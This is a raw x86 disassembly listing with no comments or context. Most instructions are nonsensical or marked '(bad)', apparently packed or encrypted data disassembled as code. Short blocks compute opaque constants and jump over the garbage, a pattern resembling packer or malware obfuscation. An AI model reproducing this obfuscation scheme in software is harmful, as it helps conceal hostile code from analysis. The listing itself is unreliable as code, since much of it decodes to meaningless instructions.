  40bdf8:	stos   DWORD PTR es:[edi],eax
  40bdf9:	jmp    0x40be3f
  40bdfb:	(bad)  
  40bdfc:	gs rol ebp,1
  40bdff:	add    eax,DWORD PTR ds:0xf65cd4a1
  40be05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be06:	adc    eax,0x46c6a82b
  40be0b:	lods   eax,DWORD PTR ds:[esi]
  40be0c:	out    0x3d,al
  40be0e:	stc    
  40be0f:	add    DWORD PTR [eax+0x4faf5269],eax
  40be15:	xchg   esi,eax
  40be16:	neg    ecx
  40be18:	pop    es
  40be19:	cmp    al,0x1e
  40be1b:	jge    0x40be34
  40be1d:	es in  al,dx
  40be1f:	mov    ch,0x38
  40be21:	xor    ecx,ebx
  40be23:	lahf   
  40be24:	xor    esi,DWORD PTR [ebx]
  40be26:	out    dx,al
  40be27:	inc    ecx
  40be28:	rcl    ecx,1
  40be2a:	ret    0xb904
  40be2d:	call   0xc5e8:0xf751c87d
  40be34:	pushf  
  40be35:	in     eax,dx
  40be36:	xchg   ecx,eax
  40be37:	or     eax,0x2b7444bd
  40be3c:	jle    0x40bddf
  40be3e:	(bad)  
  40be3f:	adc    BYTE PTR [esp+ebp*2-0x6a2c6103],dh
  40be46:	pushf  
  40be47:	dec    ebx
  40be48:	out    0x35,al
  40be4a:	push   ebx
  40be4b:	test   BYTE PTR [ecx+0x6d554ecb],0x7d
  40be52:	mov    ds:0xbc389b2c,eax
  40be57:	jns    0x40be49
  40be59:	(bad)  [edi]
  40be5b:	mov    ah,0x77
  40be5d:	pop    es
  40be5e:	adc    al,0xc
  40be60:	adc    DWORD PTR [edx-0x6ba7618],edi
  40be66:	gs lahf 
  40be68:	popa   
  40be69:	or     al,BYTE PTR [ebx+0x1b0dda30]
  40be6f:	xchg   DWORD PTR [eax-0x194233ab],ecx
  40be75:	pop    ebp
  40be76:	mov    ah,0xe7
  40be78:	push   0xb4c59640
  40be7d:	cmp    bl,BYTE PTR [edi+0x18]
  40be80:	push   ds
  40be81:	mov    esi,DWORD PTR [edx-0x65]
  40be84:	repz call 0x9717:0x7ca4548e
  40be8c:	xchg   ecx,eax
  40be8d:	pop    ebx
  40be8e:	into   
  40be8f:	mov    al,0x46
  40be91:	push   ds
  40be92:	push   ebx
  40be93:	lock mov ch,ah
  40be96:	jmp    0x8dda:0x3484124e
  40be9d:	clc    
  40be9e:	das    
  40be9f:	test   BYTE PTR [eax+0xe33714f],0x43
  40bea6:	xchg   esp,eax
  40bea7:	jo     0x40be3e
  40bea9:	iret   
  40beaa:	jo     0x40be7b
  40beac:	(bad)  
  40bead:	scas   eax,DWORD PTR es:[edi]
  40beae:	jae    0x40bf18
  40beb0:	mov    ds:0x447c10c9,eax
  40beb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beb6:	outs   dx,DWORD PTR ds:[esi]
  40beb7:	inc    edi
  40beb8:	shl    BYTE PTR [ebx+eax*8],cl
  40bebb:	pop    edx
  40bebc:	jecxz  0x40beb5
  40bebe:	mov    al,ds:0x919a8527
  40bec3:	cwde   
  40bec4:	fcmovnu st,st(4)
  40bec6:	(bad)  
  40bec7:	jbe    0x40be4f
  40bec9:	add    ebx,DWORD PTR [edx+0x22381340]
  40becf:	mov    ah,0x9c
  40bed1:	outs   dx,DWORD PTR ds:[esi]
  40bed2:	jb     0x40bf16
  40bed4:	mov    al,ds:0x80eed1ad
  40bed9:	es inc ebp
  40bedb:	out    dx,al
  40bedc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bedd:	test   al,0x51
  40bedf:	xor    BYTE PTR [edi+0x5856485d],dh
  40bee5:	xchg   esp,eax
  40bee6:	and    DWORD PTR [esi+0x13],edx
  40bee9:	or     edx,0xffffffb7
  40beec:	mov    fs,WORD PTR [edi+ebp*2-0x3f]
  40bef0:	pop    esp
  40bef1:	and    ebp,DWORD PTR [ecx+0xde624fc]
  40bef7:	xchg   bl,dl
  40bef9:	mov    edx,0x2aed5f6c
  40befe:	aam    0x86
  40bf00:	clc    
  40bf01:	dec    eax
  40bf02:	push   edx
  40bf03:	inc    esi
  40bf05:	js     0x40bf5f
  40bf07:	mov    DWORD PTR [ebp-0x4],0x7584
  40bf0e:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40bf15:	mov    eax,DWORD PTR [ebp-0x8]
  40bf18:	xor    edx,edx
  40bf1a:	push   0x3
  40bf1c:	pop    ecx
  40bf1d:	div    ecx
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf22:	xor    edx,edx
  40bf24:	push   0x2
  40bf26:	add    eax,0x14d3
  40bf2b:	and    eax,ecx
  40bf2d:	mov    ecx,0x6404
  40bf32:	sub    ecx,eax
  40bf34:	mov    DWORD PTR [ebp-0x74],ecx
  40bf37:	mov    DWORD PTR [ebp-0xc],0x13b5
  40bf3e:	mov    DWORD PTR [ebp-0x8],0x2e54
  40bf45:	mov    DWORD PTR [ebp-0x4],0x2f11
  40bf4c:	mov    eax,DWORD PTR [ebp-0x8]
  40bf4f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf52:	jmp    0x40c35d
  40bf57:	std    
  40bf58:	jno    0x40bf52
  40bf5a:	dec    ecx
  40bf5b:	mov    esp,0x32b9b44c
  40bf60:	rcr    DWORD PTR [esi+0x28066e90],1
  40bf66:	rol    DWORD PTR [edx-0x39],1
  40bf69:	mov    esi,0xbec492be
  40bf6e:	mov    esi,0xdb5ed656
  40bf73:	push   ds
  40bf74:	ins    BYTE PTR es:[edi],dx
  40bf75:	lds    eax,FWORD PTR [eax-0x24]
  40bf78:	push   cs
  40bf79:	ret    0x87de
  40bf7c:	test   eax,0xe89104dc
  40bf81:	fs std 
  40bf83:	loopne 0x40bf3b
  40bf85:	ficom  WORD PTR [eax+0x4dcd78da]
  40bf8b:	pop    eax
  40bf8c:	loope  0x40bfdf
  40bf8e:	out    0xe4,al
  40bf90:	push   0xfffffff7
  40bf92:	sbb    edx,ecx
  40bf94:	cmp    eax,0x34806336
  40bf99:	and    esp,ebx
  40bf9b:	std    
  40bf9c:	scas   al,BYTE PTR es:[edi]
  40bf9d:	sar    DWORD PTR [ebp-0x43],1
  40bfa0:	ficom  DWORD PTR [edi]
  40bfa2:	pop    ds
  40bfa3:	and    BYTE PTR [ecx+0x64],al
  40bfa6:	gs je  0x40bf81
  40bfa9:	sub    al,0xca
  40bfab:	push   ds
  40bfac:	pop    eax
  40bfad:	sbb    eax,DWORD PTR [ebp-0x3b]
  40bfb0:	xor    esp,0xfbc49b4
  40bfb6:	xor    eax,0x6461bd11
  40bfbb:	pop    ebp
  40bfbc:	or     BYTE PTR [esi+0x19],ch
  40bfbf:	or     dh,ch
  40bfc1:	call   0x406bcf7c
  40bfc6:	mov    esi,0x93c8585d
  40bfcb:	jp     0x40c042
  40bfcd:	cdq    
  40bfce:	pop    ebx
  40bfcf:	enter  0xf4dd,0x38
  40bfd3:	push   es
  40bfd4:	scas   al,BYTE PTR es:[edi]
  40bfd5:	dec    esp
  40bfd6:	popf   
  40bfd7:	jns    0x40bfc8
  40bfd9:	shl    DWORD PTR [ebx+0x39],0x1e
  40bfdd:	push   ss
  40bfde:	push   es
  40bfdf:	(bad)  
  40bfe0:	dec    esp
  40bfe1:	lock jnp 0x40bf9c
  40bfe4:	inc    edx
  40bfe5:	push   esp
  40bfe6:	arpl   WORD PTR [edx-0x56],di
  40bfe9:	mov    edx,0xb640cf75
  40bfee:	or     eax,0x443c67f2
  40bff3:	mov    esp,0x301e7cd2
  40bff8:	imul   edi,DWORD PTR [esi],0x4dceb236
  40bffe:	lods   al,BYTE PTR ds:[esi]
  40bfff:	mov    al,0xd7
  40c001:	xor    ah,BYTE PTR [esi]
  40c003:	fwait
  40c004:	fwait
  40c005:	cmp    BYTE PTR [ebx+0x255299de],0x27
  40c00c:	ja     0x40c04b
  40c00e:	pop    ss
  40c00f:	mov    DWORD PTR ds:0x5f74769d,edx
  40c015:	or     al,0xf7
  40c017:	mov    ah,0xd4
  40c019:	sbb    dl,0x6e
  40c01c:	mov    cl,BYTE PTR [eax+0x10]
  40c01f:	lahf   
  40c020:	retf   0x4da5
  40c023:	adc    edx,DWORD PTR [edi-0x62806bb3]
  40c029:	xchg   esi,eax
  40c02a:	sbb    dl,ch
  40c02c:	(bad)  
  40c02d:	int    0xff
  40c02f:	dec    esi
  40c030:	lods   al,BYTE PTR ds:[esi]
  40c031:	sbb    eax,0xd39b2396
  40c036:	imul   edi,DWORD PTR [ebp-0x35],0x8ed9f1f9
  40c03d:	lods   al,BYTE PTR gs:[esi]
  40c03f:	ret    
  40c040:	retf   
  40c041:	adc    al,0xb4
  40c043:	adc    edx,DWORD PTR [edx+0x44dcb20c]
  40c049:	fsubr  DWORD PTR [edx+0x2ba704d4]
  40c04f:	mov    dl,0x3a
  40c051:	jne    0x40c033
  40c053:	in     eax,0x54
  40c055:	push   cs
  40c056:	inc    esp
  40c057:	mov    dl,0xd2
  40c059:	loopne 0x40c0b6
  40c05b:	pop    edx
  40c05c:	sub    DWORD PTR [ebp+esi*8-0x16],edx
  40c060:	lods   eax,DWORD PTR ds:[esi]
  40c061:	imul   ecx,ebx,0xffffffa2
  40c064:	xor    bh,dh
  40c066:	jmp    edx
  40c068:	jle    0x40c0c6
  40c06a:	leave  
  40c06b:	xor    al,0x16
  40c06d:	pop    ds
  40c06e:	push   esp
  40c06f:	mov    esi,0xf92dfa7e
  40c074:	iretw  
  40c076:	(bad)  
  40c077:	ja     0x40c07e
  40c079:	cmp    DWORD PTR [edx-0x3e361061],0xd8f20548
  40c083:	or     eax,0xaedc5087
  40c088:	and    BYTE PTR [ebp-0xa],0x8a
  40c08c:	cli    
  40c08d:	jl     0x40c0eb
  40c08f:	ror    BYTE PTR [ebp+0x5178969c],cl
  40c095:	sub    bh,BYTE PTR [esp+esi*4+0x1a]
  40c099:	loop   0x40c097
  40c09b:	call   0xd3b4:0x855f563f
  40c0a2:	mov    al,ds:0xebc6438a
  40c0a7:	mov    edx,0x202bed30
  40c0ac:	mov    ch,0xa2
  40c0ae:	hlt    
  40c0af:	adc    BYTE PTR [edi+0x5608d544],dh
  40c0b5:	mov    cl,0x42
  40c0b7:	fwait
  40c0b8:	mov    bl,0x6f
  40c0ba:	jg     0x40c05e
  40c0bc:	std    
  40c0bd:	lods   al,BYTE PTR ds:[esi]
  40c0be:	jnp    0x40c125
  40c0c0:	int3   
  40c0c1:	dec    esp
  40c0c2:	stos   BYTE PTR es:[edi],al
  40c0c3:	in     al,dx
  40c0c4:	and    DWORD PTR [edi-0x4aa8ab79],esp
  40c0ca:	jmp    0x40c141
  40c0cc:	push   ebp
  40c0cd:	fst    st(0)
  40c0cf:	jmp    0x46d3f6d6
  40c0d4:	jb     0x40c0fc
  40c0d6:	jb     0x40c08d
  40c0d8:	or     dh,BYTE PTR [esi]
  40c0da:	mov    eax,ds:0x7a6b1549
  40c0df:	cld    
  40c0e0:	dec    esp
  40c0e1:	and    al,0x7d
  40c0e3:	jns    0x40c0c1
  40c0e5:	pop    ds
  40c0e6:	faddp  st(4),st
  40c0e8:	mov    eax,ds:0x914194ba
  40c0ed:	jns    0x40c0ef
  40c0ef:	clc    
  40c0f0:	(bad)  
  40c0f1:	inc    DWORD PTR ds:0x3bdb77b5
  40c0f7:	cmp    DWORD PTR [eax+0xd],esi
  40c0fa:	inc    ebp
  40c0fb:	js     0x40c162
  40c0fd:	mov    WORD PTR [edi-0x25],?
  40c100:	jl     0x40c0f6
  40c102:	retf   0x9659
  40c105:	xor    BYTE PTR [edi],0x8b
  40c108:	sub    edx,DWORD PTR [ebx+0x35]
  40c10b:	cmp    al,0xfc
  40c10d:	shr    BYTE PTR [eax],cl
  40c10f:	and    bh,BYTE PTR [esi+0x543ee5b7]
  40c115:	xchg   BYTE PTR [ebx+0x56c14460],cl
  40c11b:	lea    eax,[ecx]
  40c11d:	inc    eax
  40c11e:	loop   0x40c0e3
  40c120:	sub    ch,0x42
  40c123:	data16 sbb dl,BYTE PTR [edx+0x10]
  40c127:	aas    
  40c128:	fwait
  40c129:	adc    ah,BYTE PTR [edx+eax*1]
  40c12c:	into   
  40c12d:	adc    eax,0x24220787
  40c132:	imul   eax,DWORD PTR [ebx-0x16],0xffffffea
  40c136:	mov    WORD PTR [edx],es
  40c138:	imul   esp,DWORD PTR [eax],0x39ab2d75
  40c13e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c13f:	(bad)  
  40c140:	cmp    ecx,DWORD PTR [esi-0x79]
  40c143:	out    0x51,al
  40c145:	cwd    
  40c147:	outs   dx,BYTE PTR ds:[esi]
  40c148:	into   
  40c149:	dec    ecx
  40c14a:	in     al,0x6
  40c14c:	stos   DWORD PTR es:[edi],eax
  40c14d:	out    dx,al
  40c14e:	add    DWORD PTR [ebp+edx*4-0x1b],edi
  40c152:	mov    ecx,0xb369fb22
  40c157:	dec    edi
  40c158:	call   0xbf269d80
  40c15d:	push   ss
  40c15e:	cli    
  40c15f:	xchg   edi,eax
  40c160:	aas    
  40c161:	shl    al,1
  40c163:	cmp    ebx,edx
  40c165:	xchg   esi,eax
  40c166:	push   ds
  40c167:	add    al,0xb4
  40c169:	popa   
  40c16a:	test   BYTE PTR [eax],bh
  40c16c:	fnstcw WORD PTR [edi]
  40c16e:	fdivr  DWORD PTR [ecx+0x4eea70a1]
  40c174:	test   al,0x50
  40c176:	rcr    edx,cl
  40c178:	cli    
  40c179:	jae    0x40c197
  40c17b:	rcr    DWORD PTR [edi-0x4c],cl
  40c17e:	and    BYTE PTR [esi+0x6b],ah
  40c181:	cmc    
  40c182:	sub    DWORD PTR [ebx],ebp
  40c184:	sub    DWORD PTR [ebp+ebx*4-0x59eb70e5],ecx
  40c18b:	pop    edi
  40c18c:	imul   eax,DWORD PTR [ebp-0x97b1df3],0x75
  40c193:	and    al,BYTE PTR [esi+0x7f0b4188]
  40c199:	loopne 0x40c18e
  40c19b:	push   edx
  40c19c:	ja     0x40c15d
  40c19e:	pop    ebp
  40c19f:	cmp    al,0xce
  40c1a1:	pop    esi
  40c1a2:	cmp    al,0x18
  40c1a4:	mov    eax,0xc0bcc90c
  40c1a9:	imul   esi,DWORD PTR [eax-0x3a],0xb2262e42
  40c1b0:	or     eax,0x5f26c180
  40c1b5:	push   es
  40c1b6:	ins    DWORD PTR es:[edi],dx
  40c1b7:	lock xchg ecx,eax
  40c1b9:	(bad)  
  40c1bb:	clc    
  40c1bc:	aaa    
  40c1bd:	cwde   
  40c1be:	ins    DWORD PTR es:[edi],dx
  40c1bf:	cmp    DWORD PTR [ecx-0x78df0b59],0x5a
  40c1c6:	test   DWORD PTR [eax],ebp
  40c1c8:	sbb    esi,ebx
  40c1ca:	sti    
  40c1cb:	mov    eax,ds:0x9122963
  40c1d0:	xor    dh,ah
  40c1d2:	in     al,0xd9
  40c1d4:	fidiv  DWORD PTR [ecx]
  40c1d6:	sar    ah,cl
  40c1d8:	dec    esi
  40c1d9:	lahf   
  40c1da:	and    BYTE PTR [eax-0x1b],ch
  40c1dd:	dec    edi
  40c1de:	mov    ds:0x6393c984,eax
  40c1e3:	mov    dl,dh
  40c1e5:	ins    BYTE PTR es:[edi],dx
  40c1e6:	in     eax,dx
  40c1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1e8:	loope  0x40c219
  40c1ea:	mov    al,0x67
  40c1ec:	in     eax,dx
  40c1ed:	mov    ch,0xbb
  40c1ef:	fdiv   DWORD PTR [edx+0x46]
  40c1f2:	sbb    al,0xfa
  40c1f4:	clc    
  40c1f5:	outs   dx,BYTE PTR ds:[esi]
  40c1f6:	pusha  
  40c1f7:	sbb    BYTE PTR [edx+0x55],cl
  40c1fa:	dec    ebp
  40c1fb:	dec    ecx
  40c1fc:	in     eax,0xb0
  40c1fe:	and    DWORD PTR [eax+edx*1-0x74],eax
  40c202:	aam    0x11
  40c204:	std    
  40c205:	stc    
  40c206:	adc    BYTE PTR [ebp-0x12],al
  40c209:	sbb    eax,DWORD PTR [edx+ebx*8+0x9]
  40c20d:	icebp  
  40c20e:	pop    ebx
  40c20f:	(bad)  
  40c210:	repnz dec ebx
  40c212:	mov    ds:0x229ce30f,eax
  40c217:	pop    ss
  40c218:	loop   0x40c266
  40c21a:	add    esi,0x37
  40c21d:	outs   dx,BYTE PTR ds:[esi]
  40c21e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c21f:	jl     0x40c272
  40c221:	push   eax
  40c222:	jecxz  0x40c21b
  40c224:	sub    al,0x14
  40c226:	ds cs in al,dx
  40c229:	sub    DWORD PTR ss:[edi-0x2009b594],0xffffffb9
  40c231:	jmp    0x5afb:0xe45a720e
  40c238:	pop    edx
  40c239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c23a:	jbe    0x40c1c1
  40c23c:	les    edi,FWORD PTR [edx+0x4b4b8524]
  40c242:	stc    
  40c243:	jle    0x40c279
  40c245:	and    BYTE PTR [edx],al
  40c247:	and    bh,BYTE PTR [ebp-0x43]
  40c24a:	sub    eax,0x5ab6cd10
  40c24f:	fistp  WORD PTR [esi+0x46]
  40c252:	fs dec ebx
  40c254:	enter  0x9cf5,0xe6
  40c258:	push   esi
  40c259:	jbe    0x40c26a
  40c25b:	xor    eax,0xafb3288d
  40c260:	int    0xe9
  40c262:	jl     0x40c254
  40c264:	pop    edi
  40c265:	call   0x8f5a:0x6b79ec48
  40c26c:	imul   esp,edx,0x2fd96f6c
  40c272:	xlat   BYTE PTR ds:[ebx]
  40c273:	scas   eax,DWORD PTR es:[edi]
  40c274:	outs   dx,BYTE PTR ds:[esi]
  40c275:	and    cl,dl
  40c277:	xor    ch,BYTE PTR [ecx+0x55]
  40c27a:	nop
  40c27b:	add    al,0xb0
  40c27d:	mov    WORD PTR [ecx-0x25bf0a8c],?
  40c283:	mov    ds:0xf51e99dc,eax
  40c288:	loope  0x40c249
  40c28a:	fisubr DWORD PTR [ebx]
  40c28c:	in     al,dx
  40c28d:	shr    DWORD PTR [ecx],1
  40c28f:	jae    0x40c2a6
  40c291:	push   DWORD PTR [edx-0x376ceed9]
  40c297:	iret   
  40c298:	and    DWORD PTR [ebx+0x13],edi
  40c29b:	lods   eax,DWORD PTR ds:[esi]
  40c29c:	iret   
  40c29d:	adc    ch,ch
  40c29f:	(bad)  
  40c2a0:	mov    DWORD PTR [edx+eiz*1-0x63],esp
  40c2a4:	jmp    0x7e603ca7
  40c2a9:	sub    ebp,DWORD PTR [edx]
  40c2ab:	lea    eax,[ebx+esi*4]
  40c2ae:	push   0x2487f7ed
  40c2b3:	and    eax,0xb8a021ae
  40c2b8:	gs adc al,0x42
  40c2bb:	popa   
  40c2bc:	outs   dx,DWORD PTR ds:[esi]
  40c2bd:	sahf   
  40c2be:	or     edx,ebx
  40c2c0:	jg     0x40c2d0
  40c2c2:	jge    0x40c2a8
  40c2c4:	addr16 mov eax,0x836e050b
  40c2ca:	gs sbb eax,0x2e034880
  40c2d0:	icebp  
  40c2d1:	loop   0x40c2b7
  40c2d3:	retf   
  40c2d4:	dec    edi
  40c2d5:	sub    ecx,DWORD PTR [eax-0x42]
  40c2d8:	or     BYTE PTR [ebx-0x4d622631],0x4b
  40c2df:	in     al,dx
  40c2e0:	inc    eax
  40c2e1:	add    cl,BYTE PTR [edx+0x372b9817]
  40c2e7:	and    al,0x19
  40c2e9:	stos   BYTE PTR es:[edi],al
  40c2ea:	add    al,0x85
  40c2ec:	adc    DWORD PTR [ecx+0x2285f4e7],edi
  40c2f2:	gs js  0x40c2fe
  40c2f5:	push   ecx
  40c2f6:	sub    edx,eax
  40c2f8:	inc    edi
  40c2f9:	mov    ss,WORD PTR [esi]
  40c2fb:	dec    ecx
  40c2fc:	js     0x40c313
  40c2fe:	aam    0xa0
  40c300:	sub    DWORD PTR ds:0x86749c33,esi
  40c306:	test   DWORD PTR [ebx],edi
  40c308:	mov    esi,0xc7b3c940
  40c30d:	push   ebx
  40c30e:	stc    
  40c30f:	out    0x55,eax
  40c311:	mov    al,ds:0x1a2e44ae
  40c316:	cmp    esp,DWORD PTR [eax+0x73]
  40c319:	xor    esp,DWORD PTR [ebx+0x5c]
  40c31c:	or     BYTE PTR fs:[eax+0x222dbce9],0xdf
  40c324:	fist   WORD PTR [edi+0x51336555]
  40c32a:	fs shl dl,1
  40c32d:	cli    
  40c32e:	sahf   
  40c32f:	call   0x1b6aa9b9
  40c334:	les    eax,FWORD PTR [ecx+0x68f2d6ce]
  40c33a:	add    bh,BYTE PTR [edi-0x27]
  40c33d:	xchg   edi,eax
  40c33e:	push   0x86b5f84a
  40c343:	fidiv  WORD PTR [edi-0x15]
  40c346:	pop    ss
  40c347:	std    
  40c348:	mov    eax,0xb6ca77ef
  40c34d:	sar    BYTE PTR [ebp-0x45406b89],1
  40c353:	clc    
  40c354:	or     DWORD PTR [eax-0x77992bad],edx
  40c35a:	mov    esi,0x848d4783
  40c35f:	add    DWORD PTR [edx+ebx*4],edx
  40c362:	(bad)  
  40c363:	(bad)  
  40c364:	mov    ecx,0x5e208
  40c369:	div    ecx
  40c36b:	mov    ecx,DWORD PTR [ebp-0xc]
  40c36e:	lea    eax,[eax+ecx*1+0x40c7]
  40c375:	mov    DWORD PTR [ebp-0x24],eax
  40c378:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40c37f:	mov    DWORD PTR [ebp-0x8],0x16ac
  40c386:	mov    DWORD PTR [ebp-0xc],0x2185
  40c38d:	mov    eax,DWORD PTR [ebp-0xc]
  40c390:	mov    ecx,DWORD PTR [ebp-0x8]
  40c393:	xor    eax,0x1f75
  40c398:	sub    eax,ecx
  40c39a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c39d:	sub    eax,ecx
  40c39f:	xor    eax,0xc3e
  40c3a4:	mov    DWORD PTR [ebp-0x58],eax
  40c3a7:	mov    DWORD PTR [ebp-0x14],0x66bd
  40c3ae:	pop    ecx
  40c3af:	mov    DWORD PTR [ebp-0x4],ecx
  40c3b2:	mov    DWORD PTR [ebp-0x8],0x3374
  40c3b9:	mov    DWORD PTR [ebp-0xc],0x3c31
  40c3c0:	mov    eax,DWORD PTR [ebp-0xc]
  40c3c3:	mov    edx,DWORD PTR [ebp-0x8]
  40c3c6:	mov    esi,DWORD PTR [ebp-0x4]
  40c3c9:	xor    eax,edx
  40c3cb:	xor    edx,edx
  40c3cd:	div    esi
  40c3cf:	mov    edx,DWORD PTR [ebp-0x14]
  40c3d2:	and    eax,edx
  40c3d4:	sub    eax,0x680
  40c3d9:	mov    DWORD PTR [ebp-0x24],eax
  40c3dc:	mov    DWORD PTR [ebp-0x30],0x5f68
  40c3e3:	mov    DWORD PTR [ebp-0x2c],0x398b
  40c3ea:	mov    DWORD PTR [ebp-0x4],0x5034
  40c3f1:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40c3f8:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40c3ff:	mov    DWORD PTR [ebp-0x14],0xee2
  40c406:	mov    eax,DWORD PTR [ebp-0x14]
  40c409:	add    eax,DWORD PTR [ebp-0xc]
  40c40c:	mov    edx,DWORD PTR [ebp-0x8]
  40c40f:	xor    eax,edx
  40c411:	mov    edx,DWORD PTR [ebp-0x4]
  40c414:	or     eax,edx
  40c416:	mov    edx,DWORD PTR [ebp-0x2c]
  40c419:	or     eax,edx
  40c41b:	mov    edx,DWORD PTR [ebp-0x30]
  40c41e:	and    eax,edx
  40c420:	mov    edx,0x5b68
  40c425:	sub    edx,eax
  40c427:	mov    DWORD PTR [ebp-0x24],edx
  40c42a:	mov    DWORD PTR [ebp-0x48],0x3308
  40c431:	mov    DWORD PTR [ebp-0x44],0x59a4
  40c438:	mov    DWORD PTR [ebp-0x38],0x2775
  40c43f:	mov    DWORD PTR [ebp-0x34],0x4da
  40c446:	mov    DWORD PTR [ebp-0x40],0x49d8
  40c44d:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40c454:	mov    DWORD PTR [ebp-0x28],0x338c
  40c45b:	mov    DWORD PTR [ebp-0x24],0x68ed
  40c462:	jmp    0x40c86d
  40c467:	inc    esi
  40c468:	outs   dx,DWORD PTR ds:[esi]
  40c469:	mov    ebx,0x8abcbc70
  40c46e:	ja     0x40c492
  40c470:	or     DWORD PTR [esi+0xadfb7cf],ebp
  40c476:	xchg   edx,eax
  40c477:	push   ss
  40c478:	iret   
  40c479:	mov    esi,0xbec492be
  40c47e:	mov    esi,0xdcf6726f
  40c483:	retf   0x46a6
  40c486:	out    0x42,al
  40c488:	push   edx
  40c489:	push   0xfffffff2
  40c48b:	mov    eax,ds:0xe516576f
  40c490:	push   edx
  40c491:	dec    ebp
  40c492:	fstp   TBYTE PTR [eax]
  40c494:	retf   0x7ebb
  40c497:	rcl    cl,0x62
  40c49a:	jno    0x40c510
  40c49c:	shl    DWORD PTR [esi],1
  40c49e:	xchg   esi,eax
  40c49f:	mov    dl,0xab
  40c4a1:	and    cl,BYTE PTR [ecx+0x3cf4e57e]
  40c4a7:	adc    DWORD PTR [edx+eiz*2],0xffffffe5
  40c4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ac:	in     eax,dx
  40c4ad:	add    eax,0x9cedb997
  40c4b2:	outs   dx,BYTE PTR ds:[esi]
  40c4b3:	iret   
  40c4b4:	xor    eax,0xacb427d7
  40c4b9:	and    al,0x2
  40c4bb:	repz dec eax
  40c4bd:	cmp    BYTE PTR [edi],bl
  40c4bf:	adc    DWORD PTR [esi-0x3bb752d2],ecx
  40c4c5:	leave  
  40c4c6:	jb     0x40c498
  40c4c8:	xor    BYTE PTR [ecx],bh
  40c4ca:	(bad)  
  40c4cc:	or     ah,BYTE PTR [ebp-0x58c057e0]
  40c4d2:	mov    ebx,0x2994436c
  40c4d7:	test   al,0x1a
  40c4d9:	pop    ds
  40c4da:	xor    BYTE PTR [esi-0x6057c3ac],ah
  40c4e0:	jne    0x40c520
  40c4e2:	imul   BYTE PTR [ebx]
  40c4e4:	or     edi,ebp
  40c4e6:	jge    0x40c4c4
  40c4e8:	sub    ch,ch
  40c4ea:	adc    DWORD PTR [eax+0x6a],esi
  40c4ed:	(bad)  
  40c4ee:	(bad)  
  40c4ef:	test   eax,0x11281a74
  40c4f4:	mov    eax,?
  40c4f6:	jnp    0x40c494
  40c4f8:	xchg   edi,eax
  40c4f9:	(bad)  
  40c4fb:	mov    bh,0x93
  40c4fd:	push   edi
  40c4fe:	imul   DWORD PTR [ecx]
  40c500:	or     BYTE PTR [ecx+0x3ba3aadf],cl
  40c506:	jne    0x40c506
  40c508:	ror    esp,1
  40c50a:	hlt    
  40c50b:	out    0xbe,eax
  40c50d:	add    edi,DWORD PTR [ecx+0x70]
  40c510:	push   0x45
  40c512:	stos   DWORD PTR es:[edi],eax
  40c513:	pop    eax
  40c514:	mov    ebx,0xbbf6c649
  40c519:	jbe    0x40c4fa
  40c51b:	loopne 0x40c579
  40c51d:	arpl   WORD PTR [edi-0x27],ax
  40c520:	dec    edi
  40c521:	dec    eax
  40c522:	xor    DWORD PTR [ebx+0x12],ecx
  40c525:	rcl    DWORD PTR [esi],cl
  40c527:	js     0x40c57a
  40c529:	add    ecx,edx
  40c52b:	mov    bl,0x9
  40c52d:	xor    eax,0x5a424a46
  40c532:	mov    bl,0x1a
  40c534:	push   edx
  40c535:	add    DWORD PTR [eax-0x6e],0x6f983d9f
  40c53c:	sahf   
  40c53d:	mov    DWORD PTR [eax+0x6dd01e25],eax
  40c543:	or     al,0x98
  40c545:	jne    0x40c540
  40c547:	mov    ss,WORD PTR [ebx]
  40c549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c54a:	test   eax,0x16acd0fc
  40c54f:	fwait
  40c550:	add    eax,0xdd60d5c
  40c555:	dec    ebx
  40c556:	dec    ebp
  40c557:	mov    DWORD PTR [eax],esi
  40c559:	inc    edx
  40c55a:	cmp    cl,BYTE PTR [eax]
  40c55c:	jmp    0x40c4ff
  40c55e:	pushf  
  40c55f:	sbb    BYTE PTR [ebx+eax*4-0x543541b4],al
  40c566:	adc    al,0x3a
  40c568:	jno    0x40c59b
  40c56a:	ss pop ebp
  40c56c:	sbb    al,0x2b
  40c56e:	pushf  
  40c56f:	popa   
  40c570:	pop    ebp
  40c571:	ins    DWORD PTR es:[edi],dx
  40c572:	pop    ds
  40c573:	jle    0x40c523
  40c575:	imul   ecx,DWORD PTR [esi],0xfffffff0
  40c578:	das    
  40c579:	push   esp
  40c57a:	add    DWORD PTR [edx],edi
  40c57c:	mov    es,WORD PTR [esi+ecx*2-0x6efa9a5]
  40c583:	das    
  40c584:	mov    esi,0x4578f74f
  40c589:	mov    dl,BYTE PTR [edi+eiz*2-0x20]
  40c58d:	(bad)  
  40c58e:	in     al,0xd
  40c590:	mov    ch,0x60
  40c592:	cli    
  40c593:	or     ah,BYTE PTR [esi-0xc]
  40c596:	out    dx,al
  40c597:	mov    bl,BYTE PTR [edi+0x29]
  40c59a:	idiv   ch
  40c59c:	sbb    BYTE PTR [eax+edx*4],al
  40c59f:	(bad)  
  40c5a0:	push   cs
  40c5a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5a2:	xor    dl,BYTE PTR [edx]
  40c5a4:	(bad)  
  40c5a6:	push   ds
  40c5a7:	jno    0x40c619
  40c5a9:	mov    edi,0x4bf50f7d
  40c5ae:	dec    eax
  40c5af:	dec    eax
  40c5b0:	xor    al,0xe4
  40c5b2:	loop   0x40c596
  40c5b4:	out    dx,eax
  40c5b5:	adc    esi,eax
  40c5b7:	xchg   ebp,eax
  40c5b8:	test   al,0xb1
  40c5ba:	cmp    al,0xc4
  40c5bc:	push   ebx
